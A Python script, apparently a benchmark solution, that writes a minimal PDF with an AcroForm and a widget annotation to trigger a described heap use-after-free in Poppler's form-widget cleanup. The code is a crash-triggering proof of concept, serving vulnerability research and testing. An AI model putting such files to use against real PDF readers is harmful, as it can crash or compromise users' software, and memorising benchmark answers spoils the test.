import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Poppler.
        The vulnerability occurs during the destruction of FormWidget objects where the 
        reference count of the underlying dictionary is not correctly managed, leading 
        to an extra unref and double free/UAF.
        
        The PoC is a minimal PDF with an AcroForm and a Widget Annotation.
        """
        
        header = b"%PDF-1.7\n"
        
        # Object 1: Catalog
        # References Pages (2) and AcroForm (4)
        obj1 = (b"1 0 obj\n"
                b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>\n"
                b"endobj\n")
        
        # Object 2: Pages
        # References Page (3)
        obj2 = (b"2 0 obj\n"
                b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
                b"endobj\n")
        
        # Object 3: Page
        # References Annots (array containing 5)
        obj3 = (b"3 0 obj\n"
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>\n"
                b"endobj\n")
        
        # Object 4: AcroForm
        # References Fields (array containing 5)
        obj4 = (b"4 0 obj\n"
                b"<< /Fields [5 0 R] >>\n"
                b"endobj\n")
        
        # Object 5: Widget Annotation (The Form Field)
        # This object, when processed as a FormWidget, triggers the refcount issue.
        obj5 = (b"5 0 obj\n"
                b"<< /Type /Annot /Subtype /Widget /FT /Tx /Rect [100 100 200 150] /T (PoC) /P 3 0 R >>\n"
                b"endobj\n")
        
        objects = [obj1, obj2, obj3, obj4, obj5]
        
        body = b""
        offsets = []
        current_pos = len(header)
        
        # Build body and record offsets
        for obj in objects:
            offsets.append(current_pos)
            body += obj
            current_pos += len(obj)
            
        # Build XRef Table
        # 0 6 means starting at object 0, 6 entries
        # Entry 0 is the special free entry
        xref = b"xref\n0 6\n0000000000 65535 f \n"
        
        # Entries 1-5
        for offset in offsets:
            # Format: 10-digit offset, space, 5-digit gen (00000), space, n, space, newline
            # Total 20 bytes per line
            xref += b"%010d 00000 n \n" % offset
            
        # Build Trailer
        trailer = (b"trailer\n"
                   b"<< /Size 6 /Root 1 0 R >>\n"
                   b"startxref\n"
                   b"%d\n"
                   b"%%EOF") % current_pos
                   
        return header + body + xref + trailer